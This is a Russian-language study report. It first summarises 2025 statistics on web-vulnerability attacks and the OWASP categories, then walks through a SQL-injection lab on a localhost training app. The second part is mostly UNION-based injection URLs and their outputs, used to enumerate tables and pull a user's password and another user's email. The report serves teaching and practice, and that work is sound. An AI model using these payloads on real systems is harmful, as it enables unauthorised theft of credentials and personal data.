Веб-уязвимости: статистика и практика SQL-инъекций

Часть I. Статистика атак через веб-уязвимости

Источники

  1. Verizon Data Breach Investigations Report 2025 — https://www.verizon.com/about/news/2025-data-breach-investigations-report
  2. Positive Technologies — Актуальные киберугрозы, H1 2025 — https://global.ptsecurity.com/en/research/analytics/
  3. OWASP Top Ten 2025 — https://owasp.org/www-project-top-ten/

Доля атак через веб-уязвимости

По данным Verizon DBIR 2025 (в отчёте проанализировано 22 052 инцидента в 139 странах), эксплуатация уязвимостей как способ первоначального доступа — это 20% от всех подтверждённых утечек, причём по сравнению с прошлым годом этот показатель вырос на 34%. Ещё 12% утечек приходится на прямые атаки на веб-приложения (Basic Web Application Attacks).

По российским компаниям цифры немного другие. Positive Technologies в отчёте за первое полугодие 2025 г. указывает, что эксплуатация уязвимостей встречалась в 31% успешных атак на организации. Чаще всего под удар попадали госучреждения (21%), промышленность (13%) и IT-компании (6%).

Разница между 20% (глобально) и 31% (Россия) объясняется тем, что исследования считают разные вещи: Verizon смотрит только на подтверждённые утечки данных по всему миру, а Positive Technologies считает все успешные атаки на организации внутри страны.

Распределение по типам уязвимостей

OWASP каждый год публикует Top 10 самых опасных уязвимостей веб-приложений. В версии 2025 года первые строчки выглядят так:

# Категория Пример
A01 Broken Access Control Обход авторизации, доступ к чужим данным
A02 Cryptographic Failures Передача паролей в открытом виде
A03 Injection (XSS, SQLi) SQL-инъекция, межсайтовый скриптинг
A04 Insecure Design Отсутствие защиты на уровне архитектуры
A05 Security Misconfiguration Открытые порты, дефолтные пароли

В категорию Injection (A03) входят два самых распространённых типа атак:

  • XSS (Cross-Site Scripting, CWE-79) — злоумышленник вставляет вредоносный JavaScript в страницу, который потом выполняется в браузере другого пользователя
  • SQL Injection (CWE-89) — через поле ввода передаётся SQL-код, который меняет логику запроса к базе данных

Эти два типа стабильно лидируют как по числу новых CVE, так и по частоте использования в реальных атаках. По данным Verizon DBIR 2025, в 88% прямых атак на веб-приложения использовались скомпрометированные учётные данные — нередко полученные как раз через XSS или фишинг.

Вывод

Веб-уязвимости остаются одним из главных способов атаки как в мире, так и в России. SQL-инъекции и XSS не теряют актуальности несмотря на то, что известны уже несколько десятков лет — в основном потому, что разработчики до сих пор не всегда проверяют и экранируют пользовательский ввод.

Часть II. Практика: SQL-инъекция

Задание

  1. Узнать пароль пользователя с ником Volk2
  2. Узнать почту пользователя с ником Vinni-pukh

Приложение доступно по адресу: http://localhost:8080/task/

Шаг 1. Проверка точки инъекции

На странице написано: «Введите в качестве параметра ваш id». Пробуем передать параметр через URL:

http://localhost:8080/task/?id=1

Ответ: Ваш id: 1, Ваш логин: admin — приложение работает и возвращает данные из БД.

Проверяем, уязвимо ли поле — добавляем одиночную кавычку:

http://localhost:8080/task/?id=1'

Ответ:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
for the right syntax to use near ''1'' LIMIT 0,1' at line 1

Уязвимость есть. Из текста ошибки видно, что значение id оборачивается в кавычки: WHERE id='1'.

Шаг 2. Определение числа столбцов

Используем ORDER BY чтобы понять, сколько столбцов в запросе. Пробелы заменяем на +, в конце добавляем --+ как комментарий:

http://localhost:8080/task/?id=1+ORDER+BY+1--+

Ответ: Ваш id: 1, Ваш логин: admin — норм.

http://localhost:8080/task/?id=1+ORDER+BY+2--+

Ответ: Ваш id: 1, Ваш логин: admin — норм.

http://localhost:8080/task/?id=1+ORDER+BY+3--+

Ответ: ошибка SQL.

Значит в запросе 2 столбца.

Шаг 3. UNION SELECT

Пробуем UNION SELECT с id=-1, чтобы оригинальный запрос вернул пустой результат:

http://localhost:8080/task/?id=-1+UNION+SELECT+1,2--+

Ответ: страница пустая.

Добавляем кавычку перед UNION (значение обёрнуто в кавычки):

http://localhost:8080/task/?id=-1'+UNION+SELECT+1,2--+

Ответ:

The used SELECT statements have a different number of columns

Значит столбцов не 2. Пробуем 3:

http://localhost:8080/task/?id=-1'+UNION+SELECT+1,2,3--+

Ответ: Ваш id: 1, Ваш логин: 2

Столбцов 3, на странице отображаются позиции 1 и 2.

Шаг 4. Изучение базы данных

Список таблиц:

http://localhost:8080/task/?id=-1'+UNION+SELECT+table_name,2,3+FROM+information_schema.tables+WHERE+table_schema=database()--+

Ответ: Ваш id: emails — только первая таблица.

Используем GROUP_CONCAT чтобы получить все сразу:

http://localhost:8080/task/?id=-1'+UNION+SELECT+GROUP_CONCAT(table_name),2,3+FROM+information_schema.tables+WHERE+table_schema=database()--+

Ответ: Ваш id: emails, users

Две таблицы: emails и users.

Столбцы таблицы users:

http://localhost:8080/task/?id=-1'+UNION+SELECT+GROUP_CONCAT(column_name),2,3+FROM+information_schema.columns+WHERE+table_name='users'--+

Ответ: Ваш id: USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, id, username, password

Нас интересуют username и password.

Столбцы таблицы emails:

http://localhost:8080/task/?id=-1'+UNION+SELECT+GROUP_CONCAT(column_name),2,3+FROM+information_schema.columns+WHERE+table_name='emails'--+

Ответ: Ваш id: id, email_id

Таблица содержит id (связь с таблицей users) и email_id (сам адрес почты).

Шаг 5. Пароль пользователя Volk2

http://localhost:8080/task/?id=-1'+UNION+SELECT+password,2,3+FROM+users+WHERE+username='Volk2'--+

Ответ: Ваш id: Wa spoiuuuuu

Пароль Volk2: Wa spoiuuuuu

Шаг 6. Email пользователя Vinni-pukh

Email хранится в таблице emails. Сначала находим id пользователя в таблице users:

http://localhost:8080/task/?id=-1'+UNION+SELECT+id,2,3+FROM+users+WHERE+username='Vinni-pukh'--+

Ответ: Ваш id: 4

Теперь по этому id ищем почту:

http://localhost:8080/task/?id=-1'+UNION+SELECT+email_id,2,3+FROM+emails+WHERE+id=4--+

Ответ: Ваш id: honey_lover@otus-lab.com

Email Vinni-pukh: honey_lover@otus-lab.com
